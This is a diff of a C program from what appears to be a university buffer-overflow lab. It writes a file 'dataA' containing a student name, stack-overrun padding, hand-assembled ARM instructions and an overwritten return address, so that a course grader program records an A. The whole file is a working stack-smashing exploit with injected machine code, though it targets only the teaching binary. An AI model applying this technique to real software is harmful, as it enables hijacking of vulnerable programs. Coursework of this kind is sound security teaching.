@@ -5,14 +5,14 @@
 
 #include <stdio.h>
 #include <stdint.h>
+#include <string.h>
 #include "miniassembler.h"
 
 /*
   Produces a file called dataA with the student name, a nullbyte, 
-  padding to overrun the stack, 
-  
-    FILL IN APPROPRIATE COMMENT
-
+  padding to overrun the stack, with the assembly code to overwrite
+  the 'D' in data with an 'A', which causes the grade to be returned
+  to be an A
 */
 
 /* Writes a file 'dataA' to influence the grader program's behavior and
@@ -23,8 +23,14 @@
 int main(void)
 {
     char* name = "Jonahjeff";
+
     int i;
     unsigned long ulAddr;
+    unsigned int movInstr;
+    unsigned int adrInstr;
+    unsigned int strbInstr;
+    unsigned int bInstr;
+    
     /* open a file that will be written to in write binary mode */
     FILE *f = fopen("dataA", "w");
 
@@ -35,18 +41,23 @@ int main(void)
     fwrite(name, 1, 9, f);
     fputc('\0', f);
 
-    /* writes padding to overrun the stack and go past getName*/
-    for (i = 0; i < 34; i++) {
+    /* writes padding to overrun the stack */
+    for (i = 0; i < 22; i++) {
         fputc('0', f);
     }
-    fputc(MiniAssembler_mov(0, 'A'), f);
-    fputc(MiniAssembler_adr(1, 0x420044, 0x420080), f);
-    fputc(MiniAssembler_strb(0, 1), f);
-    fputc(MiniAssembler_b(0x40089c, 0x420082), f);
-    
+    /* writes the instructions to the file */
+    movInstr = MiniAssembler_mov(0, 'A');
+    fwrite(&movInstr, sizeof(unsigned int), 1, f);
+    adrInstr = MiniAssembler_adr(1, 0x420044, 0x42007c);
+    fwrite(&adrInstr, sizeof(unsigned int), 1, f);
+    strbInstr = MiniAssembler_strb(0, 1);
+    fwrite(&strbInstr, sizeof(unsigned int), 1, f);
+    bInstr = MiniAssembler_b(0x40089c, 0x420084);
+    fwrite(&bInstr, sizeof(unsigned int), 1, f);
 
-    /* writes address of instruction in main to get a B; see memmap */
-    ulAddr = 0x420102;
+    
+    /* writes address of instruction in main to get an A; see memmap */
+    ulAddr = 0x420078;
     fwrite(&ulAddr, sizeof(unsigned long), 1, f);
 
     fclose(f);
